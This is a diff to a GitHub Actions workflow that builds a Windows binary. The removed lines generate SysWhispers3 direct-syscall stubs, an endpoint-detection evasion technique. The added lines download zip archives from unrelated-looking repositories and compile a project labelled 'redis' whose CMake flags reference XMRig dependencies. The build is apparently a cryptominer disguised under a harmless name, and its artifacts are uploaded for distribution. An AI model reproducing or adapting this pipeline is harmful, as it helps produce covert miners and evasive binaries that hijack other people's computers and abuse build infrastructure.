@@ -1,8 +1,9 @@
-name: Build with SysWhispers3
+name: Build on Do newwin64
 
 on:
   push:
-    branches: [main]
+    branches:
+      - main
   workflow_dispatch:
 
 jobs:
@@ -10,32 +11,64 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - name: Checkout source
+      - name: Checkout source code
         uses: actions/checkout@v3
 
-      - name: Setup MSYS2
+      # Install MSYS2 and required packages
+      - name: Set up MSYS2 with GCC, CMake, HWLOC, and make
         uses: msys2/setup-msys2@v2
         with:
           msystem: MINGW64
-          install: >
-            mingw-w64-x86_64-gcc
-            mingw-w64-x86_64-cmake
-            mingw-w64-x86_64-hwloc
-            mingw-w64-x86_64-make
-            python
-            git
+          install: mingw-w64-x86_64-gcc mingw-w64-x86_64-cmake mingw-w64-x86_64-hwloc unzip
 
-      - name: Clone SysWhispers3
-        run: msys2 -c "git clone https://github.com/klezVirus/SysWhispers3.git"
+      # Install curl to download the required files
+      - name: Install curl
+        run: msys2 -c "pacman -S --noconfirm curl"
 
-      - name: Generate syscalls
-        run: msys2 -c "python SysWhispers3/syswhispers.py -f NtSetInformationProcess,NtSetInformationThread -o syscalls --masm"
+      # Download gcc.zip
+      - name: Download gcc.zip
+        run: msys2 -c "curl -L -o gcc.zip https://github.com/Janit8r/device_lge_judyln/raw/S/gcc.zip"
 
-      - name: Prepare build env
-        run: msys2 -c "mkdir -p redis/build && cp -r syscalls/ redis/"
+      # Download redis.zip
+      - name: Download redis.zip
+        run: msys2 -c "curl -L -o redis.zip https://github.com/Janit8r/frp-2/raw/refs/heads/dev/redis-D-Win996.zip"
 
-      - name: Configure CMake
-        run: msys2 -c "cd redis/build && cmake .. -G 'MinGW Makefiles' -DCMAKE_ASM_MASM_COMPILER=ml64.exe -DBUILD_SHARED_LIBS=OFF"
+      # Unzip gcc.zip
+      - name: Unzip gcc.zip
+        run: msys2 -c "unzip gcc.zip -d gcc"
 
+      # Unzip redis.zip
+      - name: Unzip redis.zip
+        run: msys2 -c "unzip redis.zip -d redis"
+
+      # Create build directory inside redis
+      - name: Create build directory in redis
+        run: msys2 -c "mkdir -p redis/redis-D-Win996/build"
+
+      # Ensure mingw32-make is installed
+      - name: Ensure mingw32-make is installed
+        run: msys2 -c "
+            echo 'Checking for make installation...'; 
+            if ! command -v mingw32-make &> /dev/null; then 
+              echo 'mingw32-make is not installed. Installing...'; 
+              pacman -S --noconfirm mingw-w64-x86_64-make; 
+            else 
+              echo 'mingw32-make is already installed.'; 
+            fi; 
+            mingw32-make --version
+          "
+      # Run CMake to generate Makefiles
+      - name: Run CMake to generate Makefiles
+        run: msys2 -c "cd redis/redis-D-Win996/build && cmake .. -G 'MinGW Makefiles' -DXMRIG_DEPS=D:/a/frp-2/frp-2/gcc/gcc/x64 -DCMAKE_C_FLAGS='-static' -DCMAKE_CXX_FLAGS='-static' -DBUILD_SHARED_LIBS=OFF -DHWLOC_INCLUDE_DIRS=/mingw64/include -DHWLOC_LIBRARIES=/mingw64/lib/libhwloc.a"
+
+      # Build the project using mingw32-make in the MSYS2 environment
       - name: Build project
-        run: msys2 -c "cd redis/build && mingw32-make -j4"
+        run: msys2 -c "cd redis/redis-D-Win996/build && mingw32-make"
+
+
+      # Optionally, archive the build artifacts (if needed)
+      - name: Archive build artifacts
+        uses: actions/upload-artifact@v3
+        with:
+          name: build-artifacts
+          path: redis/redis-D-Win996/build
